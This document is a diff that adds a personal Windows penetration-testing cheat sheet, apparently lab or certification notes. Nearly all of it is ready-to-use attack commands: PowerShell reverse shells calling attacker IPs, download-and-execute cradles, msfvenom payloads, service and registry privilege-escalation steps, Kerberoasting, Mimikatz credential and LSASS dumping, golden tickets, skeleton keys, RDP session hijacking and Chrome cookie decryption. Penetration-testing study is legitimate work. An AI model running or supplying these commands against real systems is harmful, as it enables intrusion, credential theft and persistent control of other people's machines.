@@ -1,0 +1,403 @@
+
+Windows:
+- scp -r juliette@10.10.10.228:"C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\\" .
+- ../../../../../../../windows/win.ini
+- ?cmd=powershell%20(new-object%20Net.WebClient).DownloadFile(%27http://10.10.14.12/nc.exe%27,%27C:\\Users\\www-data\\Desktop\\xampp\\htdocs\\portal\\uploads\\nc.exe%27)
+- netstat -aon | find /i "listening"
+- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=9003 -b "\x00\x0a" -a x86 --platform windows -f exe -o ded.exe
+- systeminfo
+- whoami /all
+- net users
+- net user <username>
+- net user /domain
+- systeminfo (copy the systeminfo to sysinfo.txt)
+- python windows-exploit-suggester.py --database 2020-04-17-mssb.xls --systeminfo sysinfo.txt
+- ifconfig
+- arp -a
+- whoami /priv
+- reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
+- dir /Q (see user permissions)
+- icacls.exe <file.txt> /grant CHATTERBOX\Alfred:F (grant full access to Alfred)
+- powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.157/plink.exe','plink.exe')"
+- port forwarding, forward port from windows to linux
+	- run this in windows machine
+	- plink 192.168.119.157 -P 22 -C -R 127.0.0.1:445:10.11.1.31:445
+	- plink <linux ip> -P 22 -C -R 127.0.0.1:<port>:<windows ip>:<port>
+	- after do port forwarding, run winexe to send command from linux to windows
+	- winexe -U Administrator%Pass123 //127.0.0.1 "cmd.exe"
+	- plink -v -x -a -T -C -noagent -ssh -L 8081:our-nexus-instance.com:8081 username@our-nexus-instance.com
+	- plink.exe 10.1.1.1 -P 22 -C -N -D 1080 -l KALIUSER -pw PASS
+- certutil -urlcache -f http://<ip>:<port>/<file> <output_file>
+- powershell iex (New-Object New.WebClient).DownloadString('http://192.168.19.40/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.19.40 -Port 4444 | powershell -noprofile -
+- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe
+- Start-Process "<file>"
+- migrate <processID>
+- secretsdump.py -sam SAM -security SECURITY system SYSTEM LOCAL
+- kerbrute userenum -d <domain> --dc <ip> users.txt
+- kerbrute userenum -d spookysec.local --dc 10.10.10.1 users.txt
+- nmap -p 88 --script=krb5-enum-users.nse --script-args krb5-enum-users.realm='svcorp.com',userdb=/usr/share/seclists/Usernames/Names/names.txt svcorp.com
+- nmap -p389 -vv --script ldap-rootdse -Pn 10.11.1.20
+- ldapsearch -x -h svcorp.com -b "dc=svcorp,dc=com"
+- sc query state= all | find "SERVICE_NAME" | find "DISPLAY_NAME"
+- Get-ChildItem -Hidden C:\Users\Bethany\AppData\Local\Microsoft\Credentials\
+- Get-ChildItem -Hidden C:\Users\Bethhany\AppData\Roaming\Microsoft\Credentials\
+- $client = New-Object System.Net.Sockets.TCPClient("192.168.19.40",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+Chisel:
+- (windows) netsh advfirewall firewall add rule name="Chisel-Pencer" dir=in action=allow protocol=tcp localport=15997
+- (windows) server: ./chisel-pencer.exe server -p 15997 --socks5
+- (kali) clinet: ./chisel_1.7.6_linux_amd64 client 10.200.93.150:15997 9090:socks
+
+	
+Metasploit:
+- use windows/smb/ms08_067_netapi
+- use exploit/windows/fileformat/office_word_hta
+- use priv
+- getsystem
+	- getsystem -h
+	- getsystem -t 1
+- getuid
+- run post/windows/gather/hashdump
+- use exploit/windows/local/service_permissions
+- use exploit/windows/local/ms10_015_kitrap0d
+- use exploit/windows/local/bypassuac
+- run post/windows/manage/migrate 
+
+Windows File:
+- sticky note
+	- C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
+	
+
+Impacket
+- GetNPUsers.py (query accounts that dont need pre-auth)(query ASReproastable accounts from the Key Distribution Center.)
+	- GetNPUsers.py spookysec.local/svc-admin -no-pass
+	- GetNPUsers.py spookysec.local/svc-admin -request -no-pass -dc-ip 10.10.59.6
+	- Result: Return TGT for svc-admin
+- psexec.py
+	- psexec.py Administrator@<ip> -hashes <NTLM hash>
+	- Result: gain shell access
+- smbexec.py
+- wmiexec.py
+- secretsdump.py
+	- secretsdump.py spookysec.local/backup:'backup2517860'@<ip> -just-dc
+	- -just-dc (grab NTDS.DIT data and Kerberos keys)
+	- Result: return user and ntlm hash
+
+rpcclient:
+- rpcclient -U "" -N <IP> (login with anonymous)
+- enumprivs (check privileges)
+- enumdomusers
+- enumdomgroups
+- querygroup 0x204
+- querygroupmem 0x204
+- queryuser 0x3e8
+- getdompwinfo
+- getusrdompwinfo 0x44f
+- for u in $(cat user.txt); do echo -n "[*] user: $u" && rpcclient -U $u -c "getusername;quit" <ip>;done
+- rpcclient -U "username%password" -c "getusername;quit" <ip>
+
+
+MSSQL:
+- xp_cmdshell "powershell -c IEX(New-Object System.Net.WebClient).DownloadString(\"http://192.168.119.157/powercat.ps1\");powercat -c 192.168.119.157 -p 1234 -e cmd"
+
+
+Powershell:
+- powershell -nop -ep bypass
+- Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize	
+- powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
+powershell -nop -ep bypass -command "IEX (New-Object Net.WebClient).downloadString('http://192.168.19.40/powercat.ps1') ; powercat -c 192.168.19.40 -p 1234 -e cmd"
+- powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/1mK64oH'); Invoke-AllChecks"
+- powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.19.40/Sherlock.ps1') ; Find-AllVulns"
+- powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
+- powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1') ; Invoke-AllChecks"
+- powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
+- powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.119.157",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+- powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.19.40',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+- powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat
+- Invoke-WebRequest -Uri "http://www.contoso.com" -OutFile "C:\path\file"
+- Import-Module .\Invoke-Kerberoast.ps1
+	- Invoke0Kerberoast -AdminCount -Output Format Hashcat | f1 > hc.txt
+	- Invoke0Kerberoast -AdminCount -Output Format Hashcat | f1
+	- john --format=krb5tgs hash.txt --wordlist=rockyou.txt
+
+- PowerView
+	- . .\Downloads\PowerView.ps1
+	- Get-NetUser | select cn
+	- Get-NetGroup -GroupName *admin*
+	- Invoke-ShareFinder
+	- Get-NetComputer -fulldata | select operatingsystem
+	- Import-Module C:\Windows\Temp\PowerView.ps1
+	- Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
+	- Kerberoasting
+		- setspn -T offense -Q */*
+		- Add-Type -AssemblyName System.IdentityModel
+		- New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/dc-mantvydas.offense.local"
+		- kerberos::list
+		- kerberos::list /export
+- BloodHound
+	- . .\Downloads\SharpHound.ps1
+	- Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
+	- transfer loot.zip to kali and import to blooudhound
+	- query users that are Kerberoastable
+		- list all kerberoastable accounts
+
+
+SeImpersonatePrivilege, SeAssignPrimaryToken: 
+- PrintSpoofer.exe
+	- PrintSpoofer.exe -i -c powershell
+- RoguePotato.exe
+	- Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:
+	- sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.138.215:9999
+	- C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
+- JuicyPotato.exe
+- Hot Potato:
+	- powershell.exe -nop -ep bypass
+	- Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
+	- Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
+	- net localgroup administrators
+
+Check Services:
+- sc queryex type=service | find /i "SERVICE_NAME:" (show running services)
+- sc queryex type=service state=all | find /i "SERVICE_NAME:" (show all services)
+- sc queryex type=service state=inactive | find /i "SERVICE_NAME:" (show stopped services)
+
+Insecure File Permissions:
+- accesschk.exe /accepteula -uwcqv user <service>
+- sc qc <service> (SERVICE_START_NAME: <privilege>)
+- sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+- net start daclsvc
+
+Unquoted Service Path:
+- wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\"
+- wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\"
+- sc qc <service>
+- C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+	- Eg: C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+- copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+- net start unquotedsvc
+- wmic service get name,displayname,pathname,startmode
+
+Weak Registry Permissions:
+- sc qc <service>
+- C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+- reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+- net start regsvc
+- reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services
+- #Try to write every service with its current content (to check if you have write permissions)
+- for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a
+- get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "daisy Users Path Everyone"
+
+Insecure Service Executables:
+- sc qc <service>
+- C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+- copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
+- net start filepermsvc
+
+DLL Hijacking:
+- monitor the service process using process monitor
+- sc start dllsvc
+- if the service try to execute C:\Temp\hijackme.dll
+- x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
+- copy hijackme.dll to C:\Temp
+- sc stop dllsvc & sc start dllsvc
+- Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
+
+Registry - AutoRuns:
+- reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+- C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+- copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
+- rdesktop 10.10.138.215
+
+Registry - AlwaysInstallElevated:
+- reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+	- keys are set to 1 (0x1)
+- reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+	- keys are set to 1 (0x1)
+- msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
+- msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+
+Passwords - Registry:
+- reg query HKLM /f password /t REG_SZ /s
+- reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+- winexe -U 'admin%password' //10.10.138.215 cmd.exe
+
+Passwords - Saved Creds:
+- cmdkey /list
+- runas /savecred /user:admin C:\PrivEsc\reverse.exe
+
+Passwords - Security Account Manager (SAM):
+- copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
+- copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
+- python3 creddump7/pwdump.py SYSTEM SAM
+- hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
+
+Passwords - Passing the Hash: 
+- pth-winexe -U 'admin%hash' //10.10.138.215 cmd.exe
+
+Scheduled Tasks:
+- type C:\DevTools\CleanUp.ps1
+- C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+- echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+
+Insecure GUI Apps:
+- tasklist /V | findstr mspaint.exe
+- file://c:/windows/system32/cmd.exe
+
+Startup Apps:
+- C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+- cscript C:\PrivEsc\CreateShortcut.vbs (create shortcut in startup directory)
+- rdesktop -u admin 10.10.138.215
+
+Kernel Exploit:
+- run post/multi/recon/local_exploit_suggester
+
+Mimikatz:
+- sekurlsa::logonpasswords
+- sekurlsa::tickets
+- privilege::debug
+- sekurlsa::wdigest
+- sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
+	- tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
+- kerberos::ptt c:\chocolate.kirbi
+- kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
+- vault::cred
+- vault::list
+- vault::cred /patch
+- vault::cred /in:C:\Users\demo\AppData\Local\Microsoft\Vault\"
+- token::elevate
+- sekurlsa::ekeys
+- sekurlsa::dpapi
+- lsadump::lsa /inject
+- lsadump::lsa /inject /name:krbtgt
+- lsadump::lsa /patch
+- lsadump::dcsync /domain:pentestlab.local /all /csv
+- kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
+- kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080
+- kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi
+- kerberos::tgt
+- kerberos::list /export
+	- python3 kirbi2john.py -o crack_file file.kirbi
+	- hashcat -m 13100 -o hash -a 0 test.txt rockyou.txt --force
+- recover password from dump file:
+	- procdump.exe -accepteula -ma lsass.exe %TEMP%\lsass.dmp
+	- procdump.exe -accepteula -ma lsass C:\\Windows\\Temp\\lsass.dmp
+	- sekurlsa::minidump C:\Users\user\AppData\Local\Temp\lsass.dmp
+	- sekurlsa::logonPasswords
+-  LSA Protection Workaround
+	- reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
+		- check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
+	- upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
+	- import the mimidriver.sys to the system
+	- mimikatz # !+
+	- mimikatz # !processprotect /process:lsass.exe /remove
+	- mimikatz # privilege::debug    
+	- mimikatz # token::elevate
+	- mimikatz # sekurlsa::logonpasswords
+	- mimikatz # !processprotect /process:lsass.exe (re-add the protection flags to the lsass.exe process)
+	- mimikatz # !- (unload the service created)
+- LSA is running as virtualized process (LSAISO) by Credential Guard
+	- # Check if a process called lsaiso.exe exists on the running processes
+	- tasklist |findstr lsaiso
+	- # Lets inject our own malicious Security Support Provider into memory
+	- # require mimilib.dll in the same folder
+	- mimikatz # misc::memssp
+	- # Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
+- Skeleton Key
+	- privilege::debug
+	- misc::skeleton
+	- # map the share
+	- net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz
+	- # login as someone
+	- rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
+- RDP session takeover
+	- privilege::debug 
+	- token::elevate 
+	- ts::remote /id:2 
+	- # get the Session ID you want to hijack
+	- query user
+	- create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
+	- net start sesshijack
+- Credential Manager & DPAPI
+	- # check the folder to find credentials
+	- dir C:\Users\Administrator\AppData\Local\Microsoft\Credentials\*
+	- # check the file with mimikatz
+	- $ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
+	- # find master key
+	- $ mimikatz !sekurlsa::dpapi
+	- # use master key
+	- $ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
+- Chrome Cookies & Credential
+	- # Saved Cookies
+	- dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
+	- dpapi::chrome /in:"C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
+	- # Saved Credential in Chrome
+	- dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
